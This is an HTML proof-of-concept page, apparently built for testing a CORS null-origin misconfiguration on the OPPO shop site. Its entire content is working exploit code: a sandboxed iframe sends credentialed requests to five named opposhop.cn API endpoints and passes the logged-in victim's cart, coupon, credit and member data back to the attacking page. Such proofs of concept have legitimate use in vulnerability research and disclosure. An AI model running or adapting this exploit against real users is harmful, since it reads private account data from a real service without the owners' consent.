<!DOCTYPE html>
<html>
<body>

<h2>OPPO CORS NULL ORIGIN TEST</h2>

<button onclick="run()">Run Exploit</button>

<pre id="out"></pre>

<iframe id="f" sandbox="allow-scripts" style="display:none"></iframe>

<script>

const endpoints = {

cart:"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
count:"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
coupon:"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
credit:"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit",
member:"https://www.opposhop.cn/cn/oapi/users/web/member/info"

};

window.addEventListener("message",e=>{

document.getElementById("out").textContent +=
"\n"+e.data.endpoint+" -> "+e.data.body+"\n"

})

function run(){

let code = `
<script>

const endpoints = ${JSON.stringify(endpoints)}

for (let name in endpoints){

fetch(endpoints[name],{

credentials:"include"

})

.then(r=>r.text())

.then(t=>{

parent.postMessage({
endpoint:name,
body:t
},"*")

})

.catch(e=>{

parent.postMessage({
endpoint:name,
body:e.toString()
},"*")

})

}

<\/script>
`

document.getElementById("f").srcdoc = code

}

</script>

</body>
</html>
